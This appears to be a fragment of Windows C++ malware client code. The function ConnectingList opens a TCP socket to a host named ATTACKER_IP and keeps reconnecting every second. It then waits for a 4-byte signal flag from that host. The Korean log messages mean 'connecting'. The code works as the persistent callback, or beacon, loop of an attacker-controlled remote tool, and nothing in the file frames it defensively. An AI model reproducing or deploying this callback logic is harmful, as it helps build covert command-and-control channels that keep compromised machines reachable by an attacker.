#include"main.h"

void ConnectingList() 
{

	SOCKET ssock=0;
	SOCKADDR_IN saddr = { 0, };
	WSAEVENT sevent = WSACreateEvent();


	ssock = socket(AF_INET, SOCK_STREAM, 0);
	WSAEventSelect(ssock, sevent, FD_CONNECT);
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
	saddr.sin_port = htons(CONNECTING_LIST);

	while (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR) 
	{

		if (WSAGetLastError() == WSAEISCONN)
			break;

		cout << "연결중1" << endl;
		Sleep(1000);
	}
	/*while (1) {

		while (connect(ssock, (LPSOCKADDR)&saddr, 0) == SOCKET_ERROR) {


			cout <<  "컨넥팅 가능한지 보내는중...." << endl;
			Sleep(1000);
		}

		closesocket(ssock);
		ssock = socket(AF_INET, SOCK_STREAM, 0);
		cout << "컨넥팅 신호 보냄...." << endl;
		Sleep(1000);

	}*/

	while (1) 
	{


		DWORD dwret = MsgWaitForMultipleObjects(1, &sevent, FALSE, INFINITE, QS_POSTMESSAGE);
		
		if (dwret == WAIT_FAILED)
			break;

		if (dwret == WAIT_OBJECT_0 + 1)
			break;

		WSANETWORKEVENTS ne = { 0, };
		WSAEnumNetworkEvents(ssock, sevent, &ne);

		if (ne.lNetworkEvents & FD_CONNECT) 
		{
			sevent = WSACreateEvent();

			WSAEventSelect(ssock, sevent, FD_READ | FD_CLOSE);
			continue;
		}
		
		if (ne.lNetworkEvents & FD_READ) 
		{
			int flag = 0;
			
			if (recv(ssock, (char*)&flag, 4, 0) == SOCKET_ERROR) {
				
				cout << WSAGetLastError() << endl;
				goto $connect;

			}
			if (flag) {
				break;
			}
			goto $connect;
		}
		if (ne.lNetworkEvents & FD_CLOSE) 
		{
		$connect:
			
			if (ssock)
				closesocket(ssock);
			/*if (sevent)
				CloseHandle(sevent);*/

			sevent = WSACreateEvent();
			ssock = socket(AF_INET, SOCK_STREAM, 0);
			WSAEventSelect(ssock, sevent, FD_CONNECT);
			

			while (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR) 
			{
				
				if (WSAGetLastError() == WSAEISCONN)
					break;

				cout << "연결중2" << endl;
				Sleep(1000);

			}
		}


	}
	return;

}